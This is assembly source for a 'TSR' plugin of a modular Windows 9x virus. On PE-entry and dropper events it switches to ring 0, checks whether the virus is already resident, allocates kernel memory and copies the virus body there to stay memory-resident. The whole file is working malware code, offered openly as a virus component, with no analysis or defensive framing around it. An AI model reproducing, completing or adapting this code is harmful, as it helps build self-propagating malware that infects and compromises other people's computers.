   ; TSR
   ; ~~~
   ; - win9x: allocate some memory,
   ;   make virus copy,
   ;   in the new memory: call EV_TSR_IN_NEW_ADDR event
   ; - performs alredy-r0-resident check

   include                 INCLUDE\consts.inc
   include                 ring0.inc
   include                 pentry.inc
   include                 system.inc
   include                 memory.inc
   include                 dropper.inc
   include                 util.inc

   include                 plugin.inc
                           PLUGIN_START    TSR, W32R3, PERMUTABLE

   handleevent:            hookevent EV_PENTRY_START_IN_PE, go_tsr
                           hookevent EV_DROPPER_START_ARC, go_tsr
                           hookevent EV_DROPPER_START_MAIN, go_tsr
                           stc
                           retn

   go_tsr:                 pusha

                           event   EV_UTIL_IS_W9X
                           jnz     __exit

                           event   EV_TSR_IS_ALREDY
                           je      __exit

                           event   EV_TSR_BEFORE_RING0

                           mov     edx, ebp                    ; edx=arg
                           pusho   tsr_ring0code               ; edi=addr
                           pop     edi
                           event   EV_RING0_CALL_IN_RING0

   __exit:                 popa
                           stc     ; let event be handled by other plugins
                           retn

   tsr_ring0code:          mov     ebp, edx

   ;                       mov     ecx, 65536              ;;
   ;                       event   EV_MEMORY_MALLOC        ;;
   ;                       lea     esi, [edx+ecx]          ;; EDX=stk_buf
   ;                       xchg    esp, esi                ;;
   ;                       pusha                           ;;

                           ;;
                           event   EV_TSR_IN0_ONSTART

                           event   EV_SYSTEM_GET_VIR_SIZE ; out: ESI,ECX

                           event   EV_MEMORY_MALLOC
                           xchg    edi, edx                ; EDI<--new base

                           event   EV_SYSTEM_GET_VIR_SIZE ; out: ESI,ECX

                           pusha
                           cld
                           rep     movsb                   ; copy virus
                           popa

                           pusha
                           lea     ebp, [edi+size plugin_struc]
                           event   EV_TSR_IN_NEW_ADDR
                           popa

   __exit:
                           event   EV_TSR_IN0_ONEXIT
                           ;;

   ;                       popa                            ;;
   ;                       xchg    esp, esi                ;;
   ;                       event   EV_MEMORY_MFREE         ;;

                           retn

                           PLUGIN_END
